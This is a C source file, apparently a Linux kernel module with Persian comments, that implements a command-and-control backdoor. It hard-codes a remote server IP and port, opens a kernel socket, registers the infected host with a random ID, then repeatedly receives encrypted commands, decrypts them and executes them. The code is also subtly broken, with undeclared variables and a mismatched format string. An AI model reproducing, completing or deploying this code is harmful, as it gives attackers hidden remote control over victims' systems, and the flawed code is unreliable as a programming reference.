#include <linux/net.h>
#include <linux/inet.h>
#include <net/sock.h>
#include <crypto/hash.h>
#include "crypto.h"
#include "defines.h"

#define C2_SERVER "45.76.188.213"
#define C2_PORT 443
#define HEARTBEAT_INTERVAL 60 // ثانیه

// تابع ارتباط با سرور C2
void c2_communication(void) {
    struct socket *sock;
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(C2_PORT),
        .sin_addr.s_addr = in_aton(C2_SERVER),
    };
    
    // ایجاد سوکت
    sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    
    // اتصال به سرور
    if (sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0) < 0) {
        sock_release(sock);
        return;
    }
    
    // ارسال شناسه
    char uuid[64];
    generate_uuid(uuid, sizeof(uuid));
    kernel_sendmsg(sock, &msg, &vec, 1, strlen(uuid));
    
    // حلقه اصلی ارتباط
    while (!kthread_should_stop()) {
        char command[256];
        int len = kernel_recvmsg(sock, &msg, &vec, 1, sizeof(command), 0);
        
        if (len > 0) {
            // رمزگشایی دستور
            char decrypted[256];
            size_t dec_len = sizeof(decrypted);
            rsa_decrypt(command, len, decrypted, &dec_len);
            
            // اجرای دستور
            exec_command(decrypted);
        }
        
        // خواب بین ارتباطات
        msleep(HEARTBEAT_INTERVAL * 1000);
    }
    
    sock_release(sock);
}

// تولید شناسه منحصر به فرد
void generate_uuid(char *buf, size_t size) {
    char components[4][16];
    
    // بخش‌های مختلف شناسه
    get_random_bytes(components[0], 16);
    get_random_bytes(components[1], 16);
    get_random_bytes(components[2], 16);
    get_random_bytes(components[3], 16);
    
    // فرمت‌دهی نهایی
    snprintf(buf, size, 
            "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
            components[0][0], components[0][1], components[0][2], components[0][3],
            components[1][0], components[1][1], components[1][2], components[1][3],
            components[2][0], components[2][1], components[2][2], components[2][3],
            components[3][0], components[3][1], components[3][2], components[3][3]);
}
